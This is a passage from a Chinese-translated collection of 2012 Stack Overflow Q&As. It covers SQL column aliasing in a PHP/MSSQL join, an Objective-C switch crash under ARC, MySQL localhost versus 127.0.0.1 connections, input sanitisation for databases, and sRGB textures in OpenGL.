$name = $record_unscored['name'];   
$userid = $record_unscored['userid'];   
$touser = $record_unscored['touser'];

$id = $record_unscored['id'];
$username = $record_unscored['username'];   
$password = $record_unscored['password'];
} 
```

我观察到两个表中都存在一个名为“id”的键名列，因此 $id = $record_unscored['id']; 将被覆盖；

我试过 $id = $record_unscored['user.id']; 但它不工作！实际上我该如何指定表名呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:22:40.003

使用别名：

```
$check_unscored =   "
       SELECT 
           u.id
         , u.name 
         , u.userid
         , u.touser
         , t.id          AS tender_id              --- column alias
                                                   --- to remove duplicate names
         , t.username 
         , t.password
        FROM [user]   AS u                         --- table alias her
            INNER JOIN [tenderrc]   AS t           --- and here
                ON  u.[id] = t.[userid]
                    "; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T09:22:03.537

你可以创建一个别名字段等，如果你不想从用户中获取 ID，你可以使用类似这样的东西 select [user].[id] as 'userid', [tenderrc].[*] from ... 我来自 mySql 世界，但我认为它可以这样管理，然后以这种方式访问​​它 $id = $record_unscored['userid'];

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T09:20:50.253

您可以使用此功能执行此操作

[http://hu2.php.net/manual/en/function.mssql-fetch-field.php](http://hu2.php.net/manual/en/function.mssql-fetch-field.php)

它可以提供“column_source - 从中​​获取列的表”。

示例代码：

```
$result = mssql_query("....");
$check_unscored = "
  SELECT *
  FROM       [user]
  INNER JOIN [tenderrc] ON [user].[id] = [tenderrc].[userid]";
$rows = fetch_multitable( mssql_query( $check_unscored, $s ));

foreach( $rows as $row ){
  echo $row->user['id'];
  echo $row->tenderrc['id'];
}

function fetch_multitable( $result ){
  $fields = mssql_num_fields( $result );
  $infos = array();
  for( $i=0; $i < $fields; $i++ ){
    $fieldinfo = mssql_fetch_field( $r, $i );
    $infos[ $i ] = (object)array(
      'table'=> $fieldinfo -> column_source
     ,'name' => $fieldinfo -> name
    );
  }

  $rows = array();
  while( $raw = mssql_fetch_row( $r )){
    $row = array();
    foreach( $raw as $i => $v ){
      $info = $infos[ $i ];
      $row[ $inf->table ][ $inf->name ] = $v;
    }
    $rows[] = (object)$row;
  }
  return $rows;
} 
```

# objective-c - 目标c切换保留语句

> ID：10347991
> 
> 赞同：0
> 
> 时间：2012-04-27T09:16:44.440
> 
> 标签：objective-c, design-patterns, ios5

该项目适用于 iOS 5.0。我已经设置了自动引用计数，无论如何如果我写了一个保留语句，我就无法编译代码。

我在一个函数中写了一个开关，因为我不想创建 if 和很多 if else 分支。

我的代码部分相对简单并且看起来正确，但似乎只是：

```
NSUserDefaults* userDefaults = [NSUserDefaults standardUserDefaults];

switch (selectedRow) {

    case 0://English
        [userDefaults setObject:@"English" forKey:@"language"];
        break;
    case 1:// Deutsch 
        [userDefaults setObject:@"German" forKey:@"language"];   
        break;
    case 2://Français
        [userDefaults setObject:@"French" forKey:@"language"];         
        break;
    case 3://Italiano
        [userDefaults setObject:@"Italian" forKey:@"language"];       
        break;
    case 4://Español
        [userDefaults setObject:@"Spanish" forKey:@"language"];
        break;

    default:
        break;
}
// flush:
[userDefaults synchronize]; 
```

在运行时我收到这条消息： *** -[MyClass retain]: message sent to deallocated instance 0x6e78580 并且它将在某些情况下分支的 [userDefaults setObject 行将 XCode 显示为断线。

我在某处看到编译 Switch 时会创建一个类。但我不确定使用哪种语言：Java、C# 或 Obj-C，并且因为我离开了我的课程并且我正在执行 switch 类，它将释放 userDefaults 变量，这就是释放 userDefaults 对象的原因。现在我不知道如何编写这个开关来开始工作并且看起来很专业。我不想在每种情况下都创建 userDefaults 变量并在那里刷新。唯一的解决方案是将此开关写入 if-else?

这是有效的：

```
NSUserDefaults* userDefaults = [NSUserDefaults standardUserDefaults];

    switch (selectedRow) {

        case 0://English
        {
            [userDefaults setObject:@"English" forKey:@"language"];
        }
            break;
        case 1:// Deutsch 
        {
            [userDefaults setObject:@"German" forKey:@"language"];   
        }
            break;
        case 2://Français
        {
            [userDefaults setObject:@"French" forKey:@"language"];         
        }
            break;
        case 3://Italiano
        {
            [userDefaults setObject:@"Italian" forKey:@"language"];       
        }
            break;
        case 4://Español
        {
            [userDefaults setObject:@"Spanish" forKey:@"language"];
        }
            break;

        default:
            break;
    }
    // flush:
    [userDefaults synchronize]; 
```

为什么？

*   不知道为什么它确实有效，但它又崩溃了。我已经在代码中移动了变量：

    开关（选定行）{

    ```
     case 0://English
          {
              NSUserDefaults* userDefaults = [NSUserDefaults standardUserDefaults];
              [userDefaults setObject:@"English" forKey:@"language"];
              // flush:
              [userDefaults synchronize];
          }
              break;
          case 1:// Deutsch 
          {
              NSUserDefaults* userDefaults = [NSUserDefaults standardUserDefaults];
              [userDefaults setObject:@"German" forKey:@"language"]; 
              // flush:
              [userDefaults synchronize];  
          }
              break;
          case 2://Français
          {
              NSUserDefaults* userDefaults = [NSUserDefaults standardUserDefaults];
              [userDefaults setObject:@"French" forKey:@"language"]; 
              // flush:
              [userDefaults synchronize];        
          }
              break;
          case 3://Italiano
          {
              NSUserDefaults* userDefaults = [NSUserDefaults standardUserDefaults];
              [userDefaults setObject:@"Italian" forKey:@"language"];   
              // flush:
              [userDefaults synchronize];    
          }
              break;
          case 4://Español
          {
              NSUserDefaults* userDefaults = [NSUserDefaults standardUserDefaults];
              [userDefaults setObject:@"Spanish" forKey:@"language"];
              // flush:
              [userDefaults synchronize];
          }
              break;

          default:
              break;
      } 
    ```

这又崩溃了，我来这里检查答案

我看到了下面的建议：

```
NSArray * languages = [NSArray arrayWithObjects: @"English", @"German", @"French",@"Italian", @"Spanish", nil];
    NSString * selectedLanguage = [languages objectAtIndex: selectedRow];
    [[NSUserDefaults standardUserDefaults] setObject: selectedLanguage forKey:@"language"]; 
```

这次崩溃在同一行：

```
[[NSUserDefaults standardUserDefaults] setObject: selectedLanguage forKey:@"language"]; 
```

*   怎么了？不敢相信。*** -[MyClass retain]：消息发送到释放的实例 0x6b532c0

MyClass 是一个 UIViewContoller。我进行语言选择并按一些按钮导航 1 或 2 屏幕，然后我回来并再次进行语言选择，它会崩溃，但并非总是如此。但是当它崩溃时总是在同一行并且总是相同的错误消息。

有什么

```
userDefaults setObject 
```

带导航？

#------------------------------------------------ -- 得到真正的问题：比找到解决方案容易#------------------------------------ ---------------

我写了：userDefaults setObject 我还写了：这是一个 ARC 项目，它在 MyClass 保留失败，这不能是我的代码。

代码是带有操作表的语言选择。如果我进行搜索，我将获得下一个链接： [EXC_BAD_ACCESS invoking a block](https://stackoverflow.com/questions/4560321/exc-bad-access-invoking-a-block)

*   从那里我看到我应该在某处生成一个副本而不是保留。问题是为什么需要在 setObject 处保留？好吧，因为它添加了一个更改侦听器...

//[[NSUserDefaults standardUserDefaults] addObserver:self forKeyPath:@"language" options:NSKeyValueObservingOptionNew context:NULL];

代码被删除并且回调的内容在切换代码之后移动了它解决了问题 - 不需要保留来做回调

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T13:02:38.447

这个问题不是 Objective-C 特有的，而是一般的 C/C++ 所特有的。您可能想看看[这个答案](https://stackoverflow.com/questions/92396/why-cant-variables-be-declared-in-a-switch-statement)。

您的第一个代码的问题在于，Objective-C 编译器做了一些与`NSString`s 的实例化相关的魔法，这很可能导致上面链接的问题中描述的问题。简而言之：您需要在每个`case`实例化局部变量的语句周围加上大括号，并且`@"something"`正是这样做的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T12:43:11.650

不是你的问题的答案，但如何放弃`switch`和使用：

```
NSArray * languages = [NSArray arrayWithObjects: @"English", @"German", @"French",
                                                 @"Italian", @"Spanish", nil];
NSString * selectedLanguage = [languages objectAtIndex: selectedRow];
[[NSUserDefaults standardUserDefaults] setObject: selectedLanguage forKey:@"language"]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-27T12:37:35.950

部分答案：

在 Objective-C 的 switch-case 语句中，如果在 case 中声明 ivar，则必须用大括号将 case 括起来，就像在第二个示例中所做的那样（尽管我看到的示例将`break`语句放在大括号内）。

您的 case 语句没有声明变量，但也许 NSUserDefaults 在那里有效地创建了一个对象，从而使大括号成为强制性的。（编辑：正如starbugs 在下面的回答中指出的那样，当您编写@“Language”时，您*正在实例化一个对象。）*

因此，如果您的第二个示例有效，为什么不使用它呢？怎么看不专业？特别是考虑到用于大小写切换的额外大括号是 Objective-C 的标准。

# php - 无法使用 127.0.0.1 连接到 mysql

> ID：10347993
> 
> 赞同：11
> 
> 时间：2012-04-27T09:16:47.583
> 
> 标签：php, mysql, database

使用以下代码，我可以连接到 mysql： `mysql_connect("localhost","username","");`

但是，如果我更改`localhost`为，`127.0.0.1`我会收到以下错误：

无法连接到“127.0.0.1”上的 MySQL 服务器 (13)

为什么它不适用于 127.0.0.1？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-04-27T09:18:56.157

`localhost`是特殊情况并使用 UNIX 套接字而不是 TCP/IP。`127.0.0.1`没有得到那种特殊的处理。

请参阅[文档](http://dev.mysql.com/doc/refman/5.0/en/connecting.html)：

> 在 Unix 上，MySQL 程序对主机名 localhost 进行了特殊处理，与其他基于网络的程序相比，这种方式可能与您所期望的不同。对于到 localhost 的连接，MySQL 程序尝试使用 Unix 套接字文件连接到本地服务器。即使给出 --port 或 -P 选项来指定端口号，也会发生这种情况。要确保客户端与本地服务器建立 TCP/IP 连接，请使用 --host 或 -h 指定主机名值 127.0.0.1，或本地服务器的 IP 地址或名称。您还可以使用 --protocol=TCP 选项显式指定连接协议，即使对于 localhost 也是如此。

如果在使用 TCP/IP 时它不起作用，那么数据库可能没有在网络上侦听。这通常是一件好事，因为它增强了安全性（不是监听 127.0.0.1 会暴露任何问题，而是监听所有接口会提供更多攻击机会）。

如果您真的想允许通过网络进行连接，请参阅[skip-networking](http://dev.mysql.com/doc/refman/5.0/en/privileges-options.html)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T09:19:11.700

您的主机文件中是否有一个条目将 127.0.0.7 映射到本地主机？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T09:21:29.470

您的系统上是否安装/运行了超过 1 个 mysql 服务器？如果是这样，请指定您尝试访问的 mysql 服务器的端口号，例如 127.0.0.1:3306,127.0.0.1:8889 等。

如果您不知道您的系统上是否还有其他 mysql 服务器实例正在运行，请指定端口。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-27T09:21:34.137

当您在数据库`'root'@'127.0.0.1'`中的`"USER_PRIVILEGES"`表中添加权限时，您将能够访问它`"information_schema"`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-08-02T09:52:21.467

您也可以尝试禁用 SELINUX

# mysql - 数据库输入卫生

> ID：10347994
> 
> 赞同：0
> 
> 时间：2012-04-27T09:16:59.627
> 
> 标签：mysql, sql, database, sanitization

对不起，如果这个问题已经得到了一些回答，但我所看到的任何地方的答案似乎都在改变..

我真的不是 100% 确定如何处理进出数据库的数据。

例如：一个 UTF8 mysql 数据库和一个接受用户输入的表单。

在处理帖子时 - 我应该`htmlspecialchars('data',ENT_QUOTES)`在将数据保存到数据库之前将其保存到数据库中还是只保存原始数据.. 数据很可能包含特殊字符的 umlouts 等。因此，如果没有进行任何清理，我假设`<`并且`>`所有类型的引号都将完全按原样存储。

我也需要`addslashes`或`mysql_real_escape_string`在保存之前。

或者是否应该在输出上完成所有这些工作并且只对输入使用过滤，我使用 zend，所以我在大多数元素中添加了过滤器。

不确定其相关的magic_quotes，但已关闭。

**编辑 2**：

我相信我的查询使用准备好的语句`->where('fqha.form_question_has_answer_form_id = ?', $result[$input->formpage]['form_id'])`

那么这是否意味着我可以忽略对数据的任何进一步操作，只保存帖子变量包含的内容。只担心输出到页面的消毒？

**编辑**：

我正在使用学说 1.2，据我所知，这是 pdo .. 但是关于这个和上述问题，任何建议都将不胜感激

```
protected function _initDoctrine()
    {
        require_once 'Doctrine/Doctrine.php';
        require_once 'Doctrine/Overloadable.php';
        require_once 'Doctrine/Connection/Profiler.php';

        $this->getApplication()  
             ->getAutoloader()   
             ->pushAutoloader(array('Doctrine', 'autoload'), 'Doctrine');

        $manager = Doctrine_Manager::getInstance();
        $manager->setAttribute(  
            Doctrine::ATTR_MODEL_LOADING,   
            Doctrine::MODEL_LOADING_CONSERVATIVE
        );

        $cacheDriver = new Doctrine_Cache_Apc();

        $config = $this->getOption('doctrine'); 
        $conn = Doctrine_Manager::connection('mysql://user:pass@localhost/db_name', 'doctrine'); 
        $conn->setAttribute(Doctrine_Core::ATTR_QUERY_CACHE, $cacheDriver);
        $conn->setCharset('utf8');
        $conn->exec('SET NAMES utf8');

        $profiler = new Imind_Profiler_Doctrine_Firebug();
        $conn->setListener($profiler);

        return $conn;
    } 
```

# opengl - sRGB 纹理。它是否正确？

> ID：10347995
> 
> 赞同：21
> 
> 时间：2012-04-27T09:17:01.540
> 
> 标签：opengl, textures

我最近一直在阅读一些关于 sRGB 格式以及它们如何允许硬件为典型显示器自动执行颜色校正的内容。作为我阅读的一部分，我看到您可以使用普通纹理和返回结果上的 pow 函数来模拟此步骤。

无论如何，我想问两个问题，因为我以前从未使用过此功能。首先，任何人都可以从我的屏幕截图中确认这是您希望看到的吗？左图是普通RGBA，右图是sRGB目标。场景中没有环境照明，模型是沼泽标准 Phong（灯光是聚光灯）。

![左显示 RGBA，右显示 SRGBA](../Images/308a8861836985fb1c4ca7549fe6e345.png)

我想问的第二个问题是硬件实际执行的校正是在什么时候？例如，我将帧写入 FBO，然后我使用 FBO 颜色缓冲区将屏幕大小的四边形渲染到后台缓冲区（我打算很快切换到延迟着色）。我应该使用附加到 FBO 的 sRGB 纹理，还是只需要指定一个 sRGB 纹理作为后台缓冲区目标？如果您使用的是 sRGB，所有纹理资源都应该是 sRGB 吗？

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2012-04-27T10:07:38.317

注意：以下讨论假设您了解什么是 sRGB 颜色空间、什么是伽马校正、什么是线性 RGB 颜色空间等等。这主要侧重于该技术的 OpenGL 实现。

如果您想深入讨论这些主题，我建议您查看我的关于[HDR/Gamma 校正](https://nicolbolas.github.io/oldtut/Illumination/Tutorial%2012.html)的教程（以了解线性色彩空间和 gamma），以及关于[sRGB 图像以及它们如何处理 gamma 校正](https://nicolbolas.github.io/oldtut/Texturing/Tutorial%2016.html)的教程。

> 首先，任何人都可以从我的屏幕截图中确认这是您希望看到的吗？

我不确定我理解你这个问题的意思。如果您应用适当的伽马校正（这是 sRGB 或多或少所做的），您通常会在图像的较暗区域获得更多细节和“更亮”的结果。

但是，正确的思考方式是，*在*您进行适当的伽马校正之前*，您的所有图像都是错误的*。您的图像太暗，伽马校正现在使它们具有适当的亮度。你所做的关于事物应该是什么颜色以及灯光应该是多亮的每一个决定都是*错误*的。

> 我想问的第二个问题是硬件实际执行的校正是在什么时候？

这是一个与您继续使用封面的“示例”部分非常不同的问题。

sRGB 图像（请记住：纹理包含图像，但帧缓冲区也可以有图像）可以在以下情况下使用：

*   将数据从用户直接传输到图像（例如，使用 glTexSubImage2D 等）。OpenGL*假定*您提供的数据已经在 sRGB 颜色空间中。所以上传数据时没有翻译数据。这样做是因为它最有意义：通常，您从艺术家那里获得的任何图像都将位于 sRGB 色彩空间中，除非艺术家竭尽全力将其置于其他色彩空间中。几乎每个图像编辑器都直接在 sRGB 中工作。

*   通过采样器读取着色器中的值（即：访问纹理）。这也很简单。OpenGL 知道图像中的纹素数据在 sRGB 颜色空间中。OpenGL 假定着色器需要*线性*RGB 颜色数据。[因此，所有从sRGB 图像格式](https://www.opengl.org/wiki/Image_Format#sRGB_colorspace)的纹理采样的尝试都将导致 sRGB->lRGB 转换。顺便说一句，这是免费的。

    从好的方面来说，如果您拥有支持 GL 3.x+ 的硬件，您几乎肯定会在线性色彩空间中完成过滤，这是有意义的。sRGB 是非线性色彩空间，因此 sRGB 值的线性插值总是错误的。

*   将从片段着色器输出的值存储到帧缓冲区图像。这是它变得稍微复杂的地方。即使您要渲染的帧缓冲区图像位于 sRGB 颜色空间中，也不足以强制转换。你必须明确`glEnable(GL_FRAMEBUFFER_SRGB)`; 这告诉 OpenGL 您从片段着色器写入的值是线性色彩空间值。因此，OpenGL在将它们存储在图像中时需要将它们转换为sRGB

    同样，如果您拥有 GL 3.x+ 硬件，您几乎肯定会在线性色彩空间中进行混合。也就是说，OpenGL 将从帧缓冲区读取 sRGB 值，将其转换为线性 RGB 值，将其与传入的线性 RGB 值（您从着色器写入的值）混合，将混合值转换为 sRGB 颜色空间并存储它. 再说一次，这就是你想要的；在 sRGB 颜色空间中混合总是很糟糕。

现在我们明白了，让我们看看你的例子。

> 例如，我将帧写入 FBO，然后我使用 FBO 颜色缓冲区将屏幕大小的四边形渲染到后台缓冲区（我打算很快切换到延迟着色）。

问题在于你没有问正确的问题。您需要记住的是这个问题，*尤其是*当您进入延迟渲染时：

这是线性RGB吗？

通常，您应该尽可能长时间地推迟将任何中间数据存储在伽马校正空间中。所以任何中间缓冲区（即：你积累灯光的地方）都不应该*是*sRGB。

这与转换成本无关；这真的是关于你在做什么。如果你在做延迟渲染，那么你可能也在做 HDR 光照等等。所以你的光积累缓冲区需要是浮点数。并且浮动缓冲区始终是线性的；他们没有理由不是线性的。

如果您想利用免费的伽马校正（并且您确实这样做了），您的最终图像（默认帧缓冲区）*必须是 sRGB。*如果您在 HDR 浮动缓冲区中完成所有工作，然后将结果色调映射到最终显示，您应该将其写入 sRGB 图像。